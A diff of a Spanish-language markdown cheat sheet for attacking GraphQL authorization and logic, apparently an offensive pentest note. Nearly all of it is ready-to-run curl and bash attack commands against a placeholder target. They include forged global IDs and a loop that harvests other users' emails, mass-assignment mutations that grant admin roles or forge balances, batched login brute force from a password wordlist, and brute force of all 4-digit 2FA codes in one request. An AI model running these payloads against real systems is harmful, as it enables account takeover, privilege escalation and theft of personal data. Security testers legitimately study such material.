@@ -23,10 +23,106 @@ linked:
 ---
 # GraphQL - Auth y Lógica
 
-> [!tip] Comando base
-> Los payloads `{"query":...}` se lanzan con:
-> `curl -sX POST -H 'Content-Type: application/json' -d '<BODY>' https://target/graphql`
-> Las filas con `sqlmap`, `curl`, `echo` o loops bash son comandos completos ejecutables tal cual.
+---
+
+## IDOR via Global IDs
+
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `echo "VXNlcjox" \| base64 -d` | Decode global ID → `User:1` | Discover format del ID. |
+| `echo -n "User:42" \| base64` | Forge global ID arbitrario | Probe IDs ajenos. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{node(id:\"VXNlcjo0Mg==\"){...on User{email phone}}}"}' https://target/graphql` | Lee user 42 con global ID forjado | Relay-style schema. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{user(id:42){email phoneNumber address}}"}' https://target/graphql` | IDOR numeric directo | App usa integers. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{deleteUser(id:42)}"}' https://target/graphql` | Delete sin owner check | Mutation IDOR. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{users(ids:[1,2,3,4,5,6,7,8,9,10]){email}}"}' https://target/graphql` | Bulk IDOR via array arg | Schema acepta lista. |
+| `for i in {1..1000}; do echo -n "User:$i" \| base64; done` | Genera lista global IDs | Wordlist para fuzz. |
+| `ffuf -u https://target/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{node(id:\"FUZZ\"){...on User{email}}}"}' -w ids.txt -mr 'email'` | Fuzz IDs y detecta hits | Bulk discovery. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{order(id:42,tenantId:1){items}}"}' https://target/graphql` con `tenantId` cambiado | Cross-tenant IDOR | Multi-tenant sin enforce. |
+^graphql-auth-idor
+
+### Bulk IDOR enumeration (bash loop)
+
+```bash
+# Enumerar emails de users 1-1000 via global IDs
+for i in $(seq 1 1000); do
+  ID=$(echo -n "User:$i" | base64)
+  EMAIL=$(curl -s -X POST -H "Content-Type: application/json" \
+    -d "{\"query\":\"{node(id:\\\"$ID\\\"){...on User{email}}}\"}" \
+    https://target/graphql | jq -r '.data.node.email // empty')
+  [ -n "$EMAIL" ] && echo "$i: $EMAIL"
+done
+```
+
+---
+
+## Mass Assignment via Mutations
+
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{__type(name:\"UserInput\"){inputFields{name type{name}}}}"}' https://target/graphql` | Lista todos los campos del input type | Pre-explotación — discover hidden fields. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{updateUser(input:{name:\"x\",isAdmin:true}){id}}"}' https://target/graphql` | Privesc via isAdmin field | Field no filtrado en backend. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{updateUser(input:{role:\"admin\"}){id}}"}' https://target/graphql` | Privesc via role string | Role como string. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{updateProfile(input:{user_id:1,...}){id}}"}' https://target/graphql` | Hijack ownership | user_id no enforced server-side. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{transfer(input:{amount:-1000000,balance:99999999}){id}}"}' https://target/graphql` | Negative transfer / forge balance | Financial bypass. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{register(input:{email:\"x@y.z\",emailVerified:true}){id}}"}' https://target/graphql` | Bypass email verification | Verified flag mutable. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{createPost(input:{title:\"x\",createdBy:1,createdAt:\"2020-01-01\"}){id}}"}' https://target/graphql` | Forge audit trail | Backdating. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{updateDoc(input:{...,isPublic:true}){id}}"}' https://target/graphql` | Visibility hijack | Public flag mutable. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{updateUser(input:{...,permissions:[\"admin:*\"]}){id}}"}' https://target/graphql` | Inject permissions array | RBAC bypass. |
+^graphql-auth-mass-assign
+
+### Mass assignment workflow
+
+```bash
+# 1. Introspection del input type
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"query":"{__type(name:\"UserUpdateInput\"){inputFields{name type{name}}}}"}' \
+  https://target/graphql | jq '.data.__type.inputFields'
+
+# 2. Identificar campos sensibles en output:
+#    - isAdmin, role, permissions, scopes
+#    - user_id, owner_id, tenant_id
+#    - email_verified, mfa_enabled, account_locked
+#    - balance, credits, points, quota
+#    - created_at, deleted_at, expires_at
+
+# 3. Inject en mutation
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"query":"mutation{updateUser(input:{name:\"harmless\",isAdmin:true,role:\"superadmin\"}){id role isAdmin}}"}' \
+  https://target/graphql
+```
+
+---
+## Query Batching para Bypass Rate Limit / Auth
+
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `curl -sX POST -H 'Content-Type: application/json' -d '[{"query":"mutation{login(u:\"a\",p:\"1\")}"},{"query":"mutation{login(u:\"a\",p:\"2\")}"}]' https://target/graphql` | Multiple ops single request | Rate limit por request — no por op. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{a:login(u:\"x\",p:\"1\"){token} b:login(u:\"x\",p:\"2\"){token}}"}' https://target/graphql` | Aliases bruteforce login | Equivalente a batch sin spec batch. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{a:verify2FA(code:\"0001\"){ok} b:verify2FA(code:\"0002\"){ok} ...}"}' https://target/graphql` | Brute 4-dígitos 2FA en single request | OTP race + rate limit bypass. |
+| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{a:resetPwd(token:\"a\"){ok} b:resetPwd(token:\"b\"){ok}}"}' https://target/graphql` | Brute reset tokens | Si tokens son cortos. |
+^graphql-auth-batching
+
+Para 100-1000 intentos generados desde wordlist en un request: ver **Batch bruteforce login (bash one-liner)** abajo.
+
+### Batch bruteforce login (bash one-liner)
+
+```bash
+# Genera batch con 100 passwords desde wordlist y manda en 1 request
+BATCH=$(awk 'NR<=100 {printf "{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"%s\\\"){token}}\"}",$1; if(NR<100)printf ","}' rockyou.txt)
+curl -X POST -H "Content-Type: application/json" -d "[$BATCH]" https://target/graphql | jq '.[] | select(.data.login.token != null)'
+```
+
+### Aliases bruteforce 2FA
+
+```bash
+# Genera 10000 aliases con códigos OTP 0000-9999
+QUERY='{'
+for i in $(seq -w 0 9999); do
+  QUERY+="a${i}:verify2FA(code:\"${i}\"){success} "
+done
+QUERY+='}'
+curl -X POST -H "Content-Type: application/json" -d "{\"query\":\"$QUERY\"}" https://target/graphql | jq '.. | .success? | select(. == true)'
+```
 
 ---
 
@@ -55,104 +151,3 @@ Body literal: `{"query":"mutation{transferFunds(to:\"attacker\",amount:1000)}","
 
 ---
 
-## Query Batching para Bypass Rate Limit / Auth
-
-| **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| `[{"query":"mutation{login(u:\"a\",p:\"1\")}"},{"query":"mutation{login(u:\"a\",p:\"2\")}"}]` | Multiple ops single request | Rate limit por request — no por op. |
-| `{"query":"{a:login(u:\"x\",p:\"1\"){token} b:login(u:\"x\",p:\"2\"){token}}"}` | Aliases bruteforce login | Equivalente a batch sin spec batch. |
-| `{"query":"{a:verify2FA(code:\"0001\"){ok} b:verify2FA(code:\"0002\"){ok} ...}"}` | Brute 4-dígitos 2FA en single request | OTP race + rate limit bypass. |
-| `{"query":"{a:resetPwd(token:\"a\"){ok} b:resetPwd(token:\"b\"){ok}}"}` | Brute reset tokens | Si tokens son cortos. |
-
-Para 100-1000 intentos generados desde wordlist en un request: ver **Batch bruteforce login (bash one-liner)** abajo.
-^graphql-auth-batching
-
-### Batch bruteforce login (bash one-liner)
-
-```bash
-# Genera batch con 100 passwords desde wordlist y manda en 1 request
-BATCH=$(awk 'NR<=100 {printf "{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"%s\\\"){token}}\"}",$1; if(NR<100)printf ","}' rockyou.txt)
-curl -X POST -H "Content-Type: application/json" -d "[$BATCH]" https://target/graphql | jq '.[] | select(.data.login.token != null)'
-```
-
-### Aliases bruteforce 2FA
-
-```bash
-# Genera 10000 aliases con códigos OTP 0000-9999
-QUERY='{'
-for i in $(seq -w 0 9999); do
-  QUERY+="a${i}:verify2FA(code:\"${i}\"){success} "
-done
-QUERY+='}'
-curl -X POST -H "Content-Type: application/json" -d "{\"query\":\"$QUERY\"}" https://target/graphql | jq '.. | .success? | select(. == true)'
-```
-
----
-
-## IDOR via Global IDs
-
-| **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| `echo "VXNlcjox" \| base64 -d` | Decode global ID → `User:1` | Discover format del ID. |
-| `echo -n "User:42" \| base64` | Forge global ID arbitrario | Probe IDs ajenos. |
-| `{"query":"{node(id:\"VXNlcjo0Mg==\"){...on User{email phone}}}"}` | Lee user 42 con global ID forjado | Relay-style schema. |
-| `{"query":"{user(id:42){email phoneNumber address}}"}` | IDOR numeric directo | App usa integers. |
-| `{"query":"mutation{deleteUser(id:42)}"}` | Delete sin owner check | Mutation IDOR. |
-| `{"query":"{users(ids:[1,2,3,4,5,6,7,8,9,10]){email}}"}` | Bulk IDOR via array arg | Schema acepta lista. |
-| `for i in {1..1000}; do echo -n "User:$i" \| base64; done` | Genera lista global IDs | Wordlist para fuzz. |
-| `ffuf -u https://target/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{node(id:\"FUZZ\"){...on User{email}}}"}' -w ids.txt -mr 'email'` | Fuzz IDs y detecta hits | Bulk discovery. |
-| `{"query":"{order(id:42,tenantId:1){items}}"}` con `tenantId` cambiado | Cross-tenant IDOR | Multi-tenant sin enforce. |
-^graphql-auth-idor
-
-### Bulk IDOR enumeration (bash loop)
-
-```bash
-# Enumerar emails de users 1-1000 via global IDs
-for i in $(seq 1 1000); do
-  ID=$(echo -n "User:$i" | base64)
-  EMAIL=$(curl -s -X POST -H "Content-Type: application/json" \
-    -d "{\"query\":\"{node(id:\\\"$ID\\\"){...on User{email}}}\"}" \
-    https://target/graphql | jq -r '.data.node.email // empty')
-  [ -n "$EMAIL" ] && echo "$i: $EMAIL"
-done
-```
-
----
-
-## Mass Assignment via Mutations
-
-| **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| `{"query":"{__type(name:\"UserInput\"){inputFields{name type{name}}}}"}` | Lista todos los campos del input type | Pre-explotación — discover hidden fields. |
-| `{"query":"mutation{updateUser(input:{name:\"x\",isAdmin:true}){id}}"}` | Privesc via isAdmin field | Field no filtrado en backend. |
-| `{"query":"mutation{updateUser(input:{role:\"admin\"}){id}}"}` | Privesc via role string | Role como string. |
-| `{"query":"mutation{updateProfile(input:{user_id:1,...}){id}}"}` | Hijack ownership | user_id no enforced server-side. |
-| `{"query":"mutation{transfer(input:{amount:-1000000,balance:99999999}){id}}"}` | Negative transfer / forge balance | Financial bypass. |
-| `{"query":"mutation{register(input:{email:\"x@y.z\",emailVerified:true}){id}}"}` | Bypass email verification | Verified flag mutable. |
-| `{"query":"mutation{createPost(input:{title:\"x\",createdBy:1,createdAt:\"2020-01-01\"}){id}}"}` | Forge audit trail | Backdating. |
-| `{"query":"mutation{updateDoc(input:{...,isPublic:true}){id}}"}` | Visibility hijack | Public flag mutable. |
-| `{"query":"mutation{updateUser(input:{...,permissions:[\"admin:*\"]}){id}}"}` | Inject permissions array | RBAC bypass. |
-^graphql-auth-mass-assign
-
-### Mass assignment workflow
-
-```bash
-# 1. Introspection del input type
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"query":"{__type(name:\"UserUpdateInput\"){inputFields{name type{name}}}}"}' \
-  https://target/graphql | jq '.data.__type.inputFields'
-
-# 2. Identificar campos sensibles en output:
-#    - isAdmin, role, permissions, scopes
-#    - user_id, owner_id, tenant_id
-#    - email_verified, mfa_enabled, account_locked
-#    - balance, credits, points, quota
-#    - created_at, deleted_at, expires_at
-
-# 3. Inject en mutation
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"query":"mutation{updateUser(input:{name:\"harmless\",isAdmin:true,role:\"superadmin\"}){id role isAdmin}}"}' \
-  https://target/graphql
-```
-
----
